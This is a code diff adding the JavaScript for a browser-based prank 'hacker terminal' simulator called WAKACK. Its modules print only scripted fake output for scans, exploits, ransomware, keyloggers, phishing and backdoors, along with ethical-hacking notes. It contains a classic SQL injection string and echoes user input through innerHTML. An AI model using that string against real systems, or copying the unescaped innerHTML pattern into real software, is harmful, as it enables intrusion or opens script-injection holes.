+            if (color === 'purple') colorClass = 'text-purple-400';
+
+            const logLine = `[${getTime()}] ${msg}`;
+            sessionLogs.push(logLine);
+
+            entry.className = `${colorClass} flex items-start space-x-2`;
+            entry.innerHTML = `<span class="text-gray-600 text-[10px] select-none">[${getTime()}]</span> <span>${msg}</span>`;
+
+            container.appendChild(entry);
+            const screen = document.getElementById('terminal-screen');
+            if (screen) screen.scrollTop = screen.scrollHeight;
+            playBeep(1200 + Math.random() * 200, 0.02, 0.02);
+        }
+
+        function setTargetFromInput() {
+            const input = document.getElementById('target-input');
+            if (input && input.value.trim()) {
+                currentTarget = input.value.trim();
+                const badge = document.getElementById('target-status-badge');
+                if (badge) {
+                    badge.innerText = "LOCKED";
+                    badge.className = "text-[9px] bg-red-600 text-white px-1.5 py-0.5 rounded font-bold animate-pulse";
+                }
+                appendLog(`[TARGET ACQUIRED] Target set to: ${currentTarget}`, 'red');
+            }
+        }
+
+        // Module Execution Engine
+        function runModule(mod) {
+            initAudio();
+            switch(mod) {
+                case 'target':
+                case '1':
+                    setTargetFromInput();
+                    break;
+                case 'recon':
+                case '2':
+                case 'scan':
+                    appendLog(`[+] Initiating Reconnaissance Port Scan on ${currentTarget}...`, 'cyan');
+                    setTimeout(() => appendLog(`[+] 22/tcp  OPEN  OpenSSH 8.2p1`, 'green'), 300);
+                    setTimeout(() => appendLog(`[+] 80/tcp  OPEN  nginx/1.18.0`, 'green'), 600);
+                    setTimeout(() => appendLog(`[!] CVE-2023-38606 Kernel vulnerability flagged`, 'red'), 900);
+                    break;
+                case 'exploit':
+                case '3':
+                case 'payload':
+                    appendLog(`[*] Generating Metasploit buffer overflow payload...`, 'yellow');
+                    setTimeout(() => appendLog(`[+] Shellcode injected into remote process memory`, 'green'), 600);
+                    break;
+                case 'hash':
+                case '4':
+                case 'decrypt':
+                    appendLog(`[*] Brute-forcing SHA-256 hashes using GPU dictionary...`, 'yellow');
+                    setTimeout(() => appendLog(`[SUCCESS] Decrypted: "admin_master_2026"`, 'green'), 800);
+                    break;
+                case 'session':
+                case '5':
+                    appendLog(`[*] Hijacking active WebSocket token...`, 'purple');
+                    setTimeout(() => appendLog(`[+] Hijacked Token: eyJhbGciOiJIUzI1Ni...`, 'green'), 500);
+                    break;
+                case 'exfil':
+                case '6':
+                    appendLog(`[*] Exfiltrating target metadata archives...`, 'yellow');
+                    setTimeout(() => appendLog(`[WARN] 0 bytes transmitted — safe local simulation`, 'yellow'), 600);
+                    break;
+                case 'cred':
+                case '7':
+                    appendLog(`[*] Dumping cached local credentials...`, 'red');
+                    setTimeout(() => appendLog(`[DUMP] root : $6$sys$qP8uY... [DECRYPTED]`, 'green'), 500);
+                    break;
+                case 'keylogger':
+                case '8':
+                    appendLog(`[*] Hooking keyboard interrupt handlers...`, 'cyan');
+                    setTimeout(() => appendLog(`[LOG] Keypress: "pass1234<ENTER>"`, 'purple'), 500);
+                    break;
+                case 'ransom':
+                case '9':
+                    appendLog(`[CRITICAL] Deploying AES-256 Ransomware Simulation...`, 'red');
+                    setTimeout(() => appendLog(`[WARN] 0 files modified — simulation complete`, 'yellow'), 700);
+                    break;
+                case 'ddos':
+                case '10':
+                    appendLog(`[*] Initiating SYN-Flood Traffic Generator...`, 'red');
+                    setTimeout(() => appendLog(`[TRAFFIC] 50,000 req/sec -> TARGET DEGRADED`, 'yellow'), 500);
+                    break;
+                case 'sqli':
+                case '11':
+                    appendLog(`[*] Testing SQL Injection: "' OR '1'='1"`, 'yellow');
+                    setTimeout(() => appendLog(`[+] DB Dump: 1,420 entries dumped`, 'green'), 500);
+                    break;
+                case 'xss':
+                case '12':
+                    appendLog(`[*] Injecting XSS payload...`, 'cyan');
+                    setTimeout(() => appendLog(`[+] Stolen Cookie: session_id=88a91c`, 'green'), 400);
+                    break;
+                case 'phish':
+                case '13':
+                    appendLog(`[*] Deploying authentication portal simulation...`, 'purple');
+                    setTimeout(() => appendLog(`[+] URL ready: https://auth-secure.wa.net/login`, 'green'), 500);
+                    break;
+                case 'logs':
+                case '14':
+                    appendLog(`[*] Extracting transmission logs...`, 'cyan');
+                    setTimeout(() => appendLog(`[+] Extracted 42 messages from queue`, 'green'), 500);
+                    break;
+                case 'persist':
+                case '15':
+                    appendLog(`[*] Installing backdoor service...`, 'red');
+                    setTimeout(() => appendLog(`[+] Service /etc/systemd/system/wa.service activated`, 'green'), 500);
+                    break;
+                case 'full':
+                case '16':
+                    appendLog(`[=== LAUNCHING FULL EXPLOIT CHAIN ===]`, 'red');
+                    ['recon', 'exploit', 'hash', 'session', 'cred'].forEach((m, idx) => {
+                        setTimeout(() => runModule(m), (idx + 1) * 400);
+                    });
+                    break;
+                case 'report':
+                case '17':
+                    exportReport();
+                    break;
+                case 'prank':
+                case '18':
+                    triggerPrank();
+                    break;
+                default:
+                    appendLog(`Unknown command or module: '${mod}'. Type 'help' for menu.`, 'red');
+            }
+        }
+
+        // CLI Handler
+        const cliInput = document.getElementById('cli-input');
+        if (cliInput) {
+            cliInput.addEventListener('keydown', (e) => {
+                playBeep(1400, 0.02, 0.02);
+                if (e.key === 'Enter') handleCliSubmit();
+            });
+        }
+
+        function handleCliSubmit() {
+            const input = document.getElementById('cli-input');
+            if (!input) return;
+            const cmd = input.value.trim().toLowerCase();
+            if (!cmd) return;
+
+            appendLog(`wakack@dark-skull:~# ${input.value}`, 'cyan');
+            input.value = '';
+
+            if (cmd === 'help') {
+                appendLog(`AVAILABLE COMMANDS:`, 'yellow');
+                appendLog(`  1-18     - Execute module by index number`, 'gray');
+                appendLog(`  scan     - Initiate target port scan`, 'gray');
+                appendLog(`  decrypt  - Run Hash cracking dictionary`, 'gray');
+                appendLog(`  payload  - Synthesize Metasploit payload`, 'gray');
+                appendLog(`  tools    - Switch to Cyber Toolkit View`, 'gray');
+                appendLog(`  blog     - Switch to Knowledge Hub View`, 'gray');
+                appendLog(`  clear    - Clear terminal screen`, 'gray');
+                appendLog(`  prank    - Show prank reveal dialog`, 'gray');
+            } else if (cmd === 'clear') {
+                const logs = document.getElementById('terminal-logs');
+                if (logs) logs.innerHTML = '';
+            } else if (cmd === 'tools') {
+                switchTab('tools');
+            } else if (cmd === 'blog') {
+                switchTab('blog');
+            } else {
+                runModule(cmd);
+            }
+        }
+
+        // Simulated Hash Cracking
+        function simulateHashCrackTool() {
+            const output = document.getElementById('decryptor-output');
+            if (!output) return;
+            output.innerHTML = `<span class="text-yellow-400 font-bold animate-pulse">Running dictionary attack [100k hashes/sec]...</span>`;
+            setTimeout(() => {
+                output.innerHTML = `<span class="text-green-400 font-bold">[CRACKED] Match Found: <u class="text-white">admin_master_2026</u> (SHA256)</span>`;
+                playBeep(1800, 0.1, 0.05);
+            }, 1200);
+        }
+
+        // Export Session Log
+        function exportReport() {
+            const text = sessionLogs.join('\n');
+            const blob = new Blob([`WAKACK v6.0 ULTRA Session Log\nTarget: ${currentTarget}\n====================================\n\n` + text], { type: 'text/plain' });
+            const a = document.createElement('a');
+            a.href = URL.createObjectURL(blob);
+            a.download = `WAKACK_Session_Report_${Date.now()}.txt`;
+            a.click();
+            appendLog(`[SYSTEM] Log file exported successfully.`, 'cyan');
+        }
+
+        // Prank Modal Trigger
+        function triggerPrank() {
+            const modal = document.getElementById('prank-modal');
+            if (modal) modal.classList.remove('hidden');
+        }
+
+        function closePrank() {
+            const modal = document.getElementById('prank-modal');
+            if (modal) modal.classList.add('hidden');
+        }
+
+        // Tab Navigation Switcher
+        function switchTab(tab) {
+            const termView = document.getElementById('view-terminal');
+            const toolsView = document.getElementById('view-tools');
+            const blogView = document.getElementById('view-blog');
+
+            const termBtn = document.getElementById('nav-terminal-btn');
+            const toolsBtn = document.getElementById('nav-tools-btn');
+            const blogBtn = document.getElementById('nav-blog-btn');
+
+            // Reset Tab Styles
+            const activeClass = "px-3 py-1 rounded text-xs font-bold transition-all bg-green-950 text-green-300 border border-green-500/50 flex items-center gap-1.5";
+            const inactiveClass = "px-3 py-1 rounded text-xs font-bold transition-all text-gray-400 hover:text-green-400 flex items-center gap-1.5";
+
+            termView.classList.add('hidden');
+            toolsView.classList.add('hidden');
+            blogView.classList.add('hidden');
+
+            termBtn.className = inactiveClass;
+            toolsBtn.className = inactiveClass;
+            blogBtn.className = inactiveClass;
+
+            if (tab === 'terminal') {
+                termView.classList.remove('hidden');
+                termBtn.className = activeClass;
+            } else if (tab === 'tools') {
+                toolsView.classList.remove('hidden');
+                toolsBtn.className = activeClass;
+            } else {
+                blogView.classList.remove('hidden');
+                blogBtn.className = activeClass;
+                showArticle('art-1');
+            }
+        }
+
+        // Knowledge Hub Articles Database
+        const articles = {
+            'art-1': {
+                category: 'ARCHITECTURE',
+                title: 'WAKACK v6.0 Core Architecture',
+                content: `<p class="text-gray-300">WAKACK v6.0 ULTRA is an advanced browser-based cyber suite and terminal simulator designed for security educators, ethical researchers, and cyber enthusiasts. It operates strictly within a sandboxed local environment without making unauthorized network requests.</p>`
+            },
+            'art-2': {
+                category: 'ETHICAL RULES',
+                title: 'Simulators vs Malicious Tools',
+                content: `<p class="text-gray-300">Safe cybersecurity simulators provide realistic output representations without execution risks. Rule #1 of Ethical Hacking: Always obtain explicit authorization before testing any target infrastructure.</p>`
+            },
+            'art-3': {
+                category: 'LOCAL SETUP',
+                title: 'Running WAKACK CLI Locally',
+                content: `<div class="bg-gray-950 p-3 rounded border border-green-500/30 text-green-400 font-mono text-xs"># Clone repository<br>git clone https://github.com/wakack/wakack-cli.git<br>cd wakack-cli<br><br># Launch terminal interface<br>python3 wakack_main.py</div>`
+            },
+            'art-4': {
+                category: 'CYBER DEFENSE',
+                title: 'Hardening Linux Systems',
+                content: `<p class="text-gray-300">Protect systems by disabling root SSH login, enforcing multi-factor authentication, restricting open ports, and applying continuous security patches.</p>`
+            }
+        };
+
+        function showArticle(artId) {
+            const art = articles[artId];
+            if (!art) return;
+            const reader = document.getElementById('article-reader');
+            if (reader) {
+                reader.innerHTML = `
+                    <div class="border-b border-green-500/30 pb-2 mb-3">
+                        <span class="text-xs text-cyan-400 font-bold uppercase">${art.category}</span>
+                        <h1 class="orbitron text-lg font-bold text-green-400 mt-1">${art.title}</h1>
+                    </div>
+                    <div>${art.content}</div>
+                `;
+            }
+        }
+    </script>
+</body>
+</html>
